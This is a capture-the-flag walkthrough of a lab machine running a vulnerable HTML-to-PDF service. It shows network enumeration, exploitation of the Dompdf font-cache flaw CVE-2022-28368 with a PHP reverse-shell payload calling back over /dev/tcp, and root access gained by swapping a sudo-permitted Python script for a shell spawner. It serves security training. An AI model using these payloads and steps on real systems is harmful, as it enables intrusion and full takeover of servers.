@@ -1,0 +1,467 @@
+			ENUMERATION
+
+
+---ifconfig---
+
+┌──(root㉿kali)-[/home/okina]
+└─# ifconfig
+eth0: flags=4163<UP,BROADCAST,RUNNING,MULTICAST>  mtu 1500
+        inet 10.0.2.15  netmask 255.255.255.0  broadcast 10.0.2.255
+        inet6 fe80::a00:27ff:fef6:e3c3  prefixlen 64  scopeid 0x20<link>
+        ether 08:00:27:f6:e3:c3  txqueuelen 1000  (Ethernet)
+        RX packets 2623498  bytes 1154879808 (1.0 GiB)
+        RX errors 0  dropped 0  overruns 0  frame 0
+        TX packets 2409960  bytes 368831713 (351.7 MiB)
+        TX errors 0  dropped 0 overruns 0  carrier 0  collisions 0
+
+lo: flags=73<UP,LOOPBACK,RUNNING>  mtu 65536
+        inet 127.0.0.1  netmask 255.0.0.0
+        inet6 ::1  prefixlen 128  scopeid 0x10<host>
+        loop  txqueuelen 1000  (Local Loopback)
+        RX packets 80  bytes 5513 (5.3 KiB)
+        RX errors 0  dropped 0  overruns 0  frame 0
+        TX packets 80  bytes 5513 (5.3 KiB)
+        TX errors 0  dropped 0 overruns 0  carrier 0  collisions 0
+
+
+
+
+---netdiscover---
+
+                                                                                                                        
+┌──(root㉿kali)-[/home/okina]
+└─# netdiscover -i eth0 -r 10.0.2.0/24 -c 200
+
+
+ Currently scanning: 10.0.2.0/24   |   Screen View: Unique Hosts                                                       
+                                                                                                                       
+ 16 Captured ARP Req/Rep packets, from 4 hosts.   Total size: 960                                                      
+ _____________________________________________________________________________
+   IP            At MAC Address     Count     Len  MAC Vendor / Hostname      
+ -----------------------------------------------------------------------------
+ 10.0.2.1        52:54:00:12:35:00      4     240  Unknown vendor                                                      
+ 10.0.2.2        52:54:00:12:35:00      4     240  Unknown vendor                                                      
+ 10.0.2.3        08:00:27:e9:d2:3c      4     240  PCS Systemtechnik GmbH                                              
+ 10.0.2.38       08:00:27:6c:7c:15      4     240  PCS Systemtechnik GmbH                                              
+
+zsh: suspended  netdiscover -i eth0 -r 10.0.2.0/24 -c 200
+                                                            
+
+
+---nmap---
+
+┌──(root㉿kali)-[/home/okina]
+└─# nmap 10.0.2.38 -sS -sC -sV -A -T4 -p-    
+Starting Nmap 7.94SVN ( https://nmap.org ) at 2024-04-19 21:50 +03
+Nmap scan report for 10.0.2.38
+Host is up (0.0010s latency).
+Not shown: 65533 closed tcp ports (reset)
+PORT   STATE SERVICE VERSION
+22/tcp open  ssh     OpenSSH 9.2p1 Debian 2+deb12u2 (protocol 2.0)
+| ssh-hostkey: 
+|   256 d8:7a:1e:74:a2:1a:40:74:91:1f:81:9b:05:7c:9a:f6 (ECDSA)
+|_  256 28:9f:f8:ce:7b:5d:e1:a7:fa:23:c1:fe:00:ee:63:24 (ED25519)
+80/tcp open  http    nginx 1.22.1
+|_http-title: HTML to PDF
+|_http-server-header: nginx/1.22.1
+MAC Address: 08:00:27:6C:7C:15 (Oracle VirtualBox virtual NIC)
+Device type: general purpose
+Running: Linux 4.X|5.X
+OS CPE: cpe:/o:linux:linux_kernel:4 cpe:/o:linux:linux_kernel:5
+OS details: Linux 4.15 - 5.8
+Network Distance: 1 hop
+Service Info: OS: Linux; CPE: cpe:/o:linux:linux_kernel
+
+TRACEROUTE
+HOP RTT     ADDRESS
+1   1.04 ms 10.0.2.38
+
+OS and Service detection performed. Please report any incorrect results at https://nmap.org/submit/ .
+Nmap done: 1 IP address (1 host up) scanned in 30.45 seconds
+                        
+
+
+
+---we see open http and ssh ports, lets do some more enum---
+
+┌──(root㉿kali)-[/home/okina]
+└─# python3 /opt/CTFEnum/CTFenum/CTFenum.py 10.0.2.38
+======================================================================
+[!] Checking open ports
+======================================================================
+OPEN TCP PORTS:
+[!] nmap -Pn -T3 -n -p- 10.0.2.38
+PORT   STATE SERVICE
+22/tcp open  ssh
+80/tcp open  http
+MAC Address: 08:00:27:6C:7C:15 (Oracle VirtualBox virtual NIC)
+======================================================================
+[!] Generating Nmap output
+======================================================================
+NMAP TCP OUTPUT:
+[!] nmap -T5 -n -Pn -sCV -p22,80 10.0.2.38
+PORT   STATE SERVICE VERSION
+22/tcp open  ssh     OpenSSH 9.2p1 Debian 2+deb12u2 (protocol 2.0)
+| ssh-hostkey: 
+|   256 d8:7a:1e:74:a2:1a:40:74:91:1f:81:9b:05:7c:9a:f6 (ECDSA)
+|_  256 28:9f:f8:ce:7b:5d:e1:a7:fa:23:c1:fe:00:ee:63:24 (ED25519)
+80/tcp open  http    nginx 1.22.1
+|_http-server-header: nginx/1.22.1
+|_http-title: HTML to PDF
+MAC Address: 08:00:27:6C:7C:15 (Oracle VirtualBox virtual NIC)
+Service Info: OS: Linux; CPE: cpe:/o:linux:linux_kernel
+======================================================================
+[!] Attacking port 22
+[!] SSH
+[!] You can try to bruteforce credentials using [netexec|crackmapexec|hydra].
+netexec ssh $(IP) -u usernames.txt -p passwords.txt | grep -v fail
+======================================================================
+[!] Attacking port 80
+[!] gobuster dir -u http://10.0.2.38:80 -w /opt/CTFEnum/CTFenum/mods/wordlist.txt -x .txt,.bak,.cgi,.html -t 70 -z --no-error -k
+[!] URL: http://10.0.2.38:80
+
+/dompdf               (Status: 301) [Size: 169] [--> http://10.0.2.38/dompdf/]
+/upload               (Status: 301) [Size: 169] [--> http://10.0.2.38/upload/]
+
+
+
+---we discover two more pages, lets check the website first--- 
+
+
+
+---we see that this page is html to pdf converter page, I tried to put in the link of the python server
+and apache server but it doesn't work, I keep on searching to find a way---
+
+
+
+---I find an exploit named dompdf, also shares the name of a page, this is our clue---
+
+
+Dompdf: Is an HTML to PDF converter library for PHP. It may be vulnerable to remote code execution for SSRF
+
+
+
+---Now to exploit this vulnerability we will need a .ttf file that we will convert to a .php, a css file to upload
+to the target website and a html file also. We can use a tool that was created specifically for this exploit---
+
+
+CVE-2022-28368: It is a Dompdf RCE PoC exploit tool that exloits the vulnerability of dompdf methods which are
+used for converting html's into pdf. I download it into /opt.
+It's link is https://github.com/rvizx/CVE-2022-28368
+
+
+
+┌──(root㉿kali)-[/opt]
+└─# cd /opt
+                                                                                              
+┌──(root㉿kali)-[/opt]
+└─# git clone https://github.com/rvizx/CVE-2022-28368.git
+Cloning into 'CVE-2022-28368'...
+remote: Enumerating objects: 32, done.
+remote: Counting objects: 100% (32/32), done.
+remote: Compressing objects: 100% (21/21), done.
+remote: Total 32 (delta 8), reused 26 (delta 7), pack-reused 0
+Receiving objects: 100% (32/32), 709.01 KiB | 448.00 KiB/s, done.
+Resolving deltas: 100% (8/8), done.
+                                                                                              
+                                                                      
+┌──(root㉿kali)-[/opt]
+└─# cd CVE-2022-28368 
+
+                                                                                              
+┌──(root㉿kali)-[/opt/CVE-2022-28368]
+└─# ls 
+README.md  dompdf-rce.py  requirements.txt
+
+
+
+---when we read the readme file we see that when we run it the program creates a css and a php file for us, I also
+will create a html file with a payload in it---
+
+
+                                                                                                                             
+┌──(root㉿kali)-[/opt/CVE-2022-28368]
+└─# python3 dompdf-rce.py 
+
+                CVE-2022-28368 - Dompdf RCE PoC Exploit
+                Ravindu Wickramasinghe | rvz  - @rvizx9
+                https://github.com/rvizx/CVE-2022-28368
+
+
+[inf]: selected ip address: 10.0.2.15
+[inf]: using payload: <?php exec("/bin/bash -c 'bash -i >& /dev/tcp/10.0.2.15/9002 0>&1'");?>
+[inf]: generating exploit.css and exploit_font.php files...
+[inf]: url hash: a7eac1d302fff5ade32d6555380f56b1
+[inf]: filename: exploitfont_normal_a7eac1d302fff5ade32d6555380f56b1.php
+[inf]: starting http server on port 9001..
+[inf]: sending the payloads..
+
+Serving HTTP on 0.0.0.0 port 9001 (http://0.0.0.0:9001/) ...
+[err]: failed to send the requests! check connection to the host
+                               
+
+┌──(root㉿kali)-[/opt/CVE-2022-28368]
+└─# nano index.html      
+
+
+┌──(root㉿kali)-[/opt/CVE-2022-28368]
+└─# cat index.html           
+<link rel=stylesheet href='http://10.0.2.15:8000/exploit.css'>
+    
+
+┌──(root㉿kali)-[/opt/CVE-2022-28368]
+└─# ls                  
+README.md  dompdf-rce.py  exploit.css  exploit_font.php  index.html  indexb.html  requirements.txt
+   
+		
+
+---I create the html file to see that if it our connection is valid in the website, lets run our server and upload
+this html into the html to pdf form---
+
+
+┌──(root㉿kali)-[/opt/CVE-2022-28368]
+└─# python3 -m http.server 8000                      
+Serving HTTP on 0.0.0.0 port 8000 (http://0.0.0.0:8000/) ...
+
+
+---write http://10.0.2.15:8000/index.html and then convert---
+
+
+┌──(root㉿kali)-[/opt/CVE-2022-28368]
+└─# python3 -m http.server 8000                      
+Serving HTTP on 0.0.0.0 port 8000 (http://0.0.0.0:8000/) ...
+10.0.2.38 - - [25/Apr/2024 00:07:41] "GET /index.html HTTP/1.1" 200 -
+10.0.2.38 - - [25/Apr/2024 00:07:41] "GET /exploit.css HTTP/1.1" 200 -
+10.0.2.38 - - [25/Apr/2024 00:07:41] "GET /exploit_font.php HTTP/1.1" 200 -
+
+
+
+---okay, we see that it works---
+
+
+
+---now what we will do is that we will change the port numbers as we wish in those files, our target here is to
+inject our harmful css code (exploit.css) into the data that will be processed by dompdf to trick the system 
+into storing a malicious font with php file extension in its font cache (exploit_font.php) which can later
+be executed from the web---
+
+
+
+---I change the port numbers of .css and .php files as seen as below---
+
+
+
+┌──(root㉿kali)-[/opt/CVE-2022-28368]
+└─# cat exploit_font.php 
+
+� dum1�cmap
+           `�,glyf5sc��head�Q6�6hhea��($hmtxD
+loca
+Tmaxp\ nameD�|8dum2�
+                     -��-����
+:83#5:08��_<�
+             @�8�&۽
+:8L��
+
+:D
+
+6				s
+<?php exec("/bin/bash -c 'bash -i >& /dev/tcp/10.0.2.15/1234 0>&1'");?>
+                           
+
+---the code above the php code doesnt' matter---
+
+
+
+┌──(root㉿kali)-[/opt/CVE-2022-28368]
+└─# cat exploit.css     
+
+@font-face {
+    font-family:'exploitfont';
+    src:url('http://10.0.2.15:8000/exploit_font.php');
+    font-weight:'normal';
+    font-style:'normal';
+}
+
+
+
+---I make sure the port that css will use is the same as my server is running---
+
+
+
+---now we check the python code to understand what we will execute from the web to have the malicious php code
+connect to us---
+
+
+---I see that an md5 hash will be used and to learn it we can use echo---  
+
+
+┌──(root㉿kali)-[/opt/CVE-2022-28368]
+└─# cat dompdf-rce.py| grep md5
+        md5_hash = hashlib.md5(url.encode()).hexdigest()
+        print("\033[94m[inf]:\033[0m url hash: "+md5_hash)
+        print("\033[94m[inf]:\033[0m filename: exploitfont_normal_"+md5_hash+".php")
+        url+="/lib/fonts/exploitfont_normal_"+md5_hash+".php"        
+                   
+       
+---in the last line we see that what we should write in the url, lets check our md5 hash also---
+
+                                                                                                                             
+┌──(root㉿kali)-[/opt/CVE-2022-28368]
+└─# echo -n 'http://10.0.2.15:8000/exploit_font.php' | md5sum                              
+e40ba77a07b263539a423524e5add10d  -
+                                   
+
+
+---and here is our md5 hash, so to sum it up our url will look like this---
+
+
+http://10.0.2.38/dompdf/lib/fonts/exploitfont_normal_e40ba77a07b263539a423524e5add10d.php
+
+
+
+---now lets set up our listener, make sure that it is the same port as the one we selected in our .php file,
+the connection will come from there after all---
+
+
+
+┌──(root㉿kali)-[/opt/CVE-2022-28368]
+└─# nc -lnvp 1234
+listening on [any] 1234 ...
+
+
+
+---then we write the url on the webpage---
+
+
+
+
+
+					GAINING FOOTHOLD
+
+
+┌──(root㉿kali)-[/opt/CVE-2022-28368]
+└─# nc -lnvp 1234
+listening on [any] 1234 ...
+connect to [10.0.2.15] from (UNKNOWN) [10.0.2.38] 56990
+bash: cannot set terminal process group (460): Inappropriate ioctl for device
+bash: no job control in this shell
+eva@convert:/var/www/html/dompdf/lib/fonts$ whoami
+whoami
+eva
+
+
+---we are in as the user eva, lets get our flag---
+
+
+eva@convert:/var/www/html/dompdf/lib/fonts$ cd /home
+cd /home
+eva@convert:/home$ ls
+ls
+eva
+eva@convert:/home$ cd eva
+cd eva
+eva@convert:~$ ls
+ls
+pdf_gen.log
+pdfgen.py
+user.txt
+eva@convert:~$ cat user.txt
+cat user.txt
+---First User Flag---
+
+
+
+---thats great, lets check for some ways to escalate our privilege and get the other flag--- 
+
+
+
+
+					PRIVILEGE ESCALATION
+
+
+eva@convert:~$ sudo -l
+sudo -l
+Matching Defaults entries for eva on convert:
+    env_reset, mail_badpass,
+    secure_path=/usr/local/sbin\:/usr/local/bin\:/usr/sbin\:/usr/bin\:/sbin\:/bin,
+    use_pty
+
+User eva may run the following commands on convert:
+    (ALL : ALL) NOPASSWD: /usr/bin/python3 /home/eva/pdfgen.py *
+
+
+
+---here we see that user eva has sudo privileges when it comes to the pdfgen.py---
+
+Note: we also see a * sign at the end of the code, this is a placeholder which means that we have to write
+something, it can be anything, at the end of the code to execute it properly
+
+
+---what we can do now is that we can find a privilege escalation method with python and overwrite it on the content
+of pdfgen.py so that when we run it, we become root user---
+
+
+---I check gtfobins and find a python command for sudo, it is this command 'import os; os.system("/bin/sh")'---
+
+
+---now, in order to not lose any main files I will create a new python file named pwn.py and write this command in it--- 
+
+
+eva@convert:~$ echo 'import os; os.system("/bin/sh")' > pwn.py      
+echo 'import os; os.system("/bin/sh")' > pwn.py
+
+
+eva@convert:~$ ls
+ls
+pdf_gen.log
+pdfgen.py
+pwn.py
+user.txt
+
+
+---and now I will move the content of pdfgen.py into another new file named pdfgen2.py, then I will move the content
+of pwn.py into pdfgen.py, because that is the python file that we have permission to execute--- 
+
+
+eva@convert:~$ mv pdfgen.py pdfgen2.py
+mv pdfgen.py pdfgen2.py
+
+eva@convert:~$ mv pwn.py pdfgen.py
+mv pwn.py pdfgen.py
+
+eva@convert:~$ cat pdfgen.py
+cat pdfgen.py
+import os; os.system("/bin/sh")
+
+
+---looking good, lets run it to gain access---
+
+
+eva@convert:~$ sudo /usr/bin/python3 /home/eva/pdfgen.py
+sudo /usr/bin/python3 /home/eva/pdfgen.py
+sudo: a terminal is required to read the password; either use the -S option to read from standard input or configure an askpass helper
+sudo: a password is required
+
+
+---that is because of the * (placeholder), lets write something at the end of the code--- 
+
+
+eva@convert:~$ sudo /usr/bin/python3 /home/eva/pdfgen.py abc
+sudo /usr/bin/python3 /home/eva/pdfgen.py abc
+
+# whoami
+whoami
+root
+# cd /root
+cd /root
+# ls     
+ls
+root.txt
+# cat root.txt
+cat root.txt
+---Root User Flag---
+
+
+
+
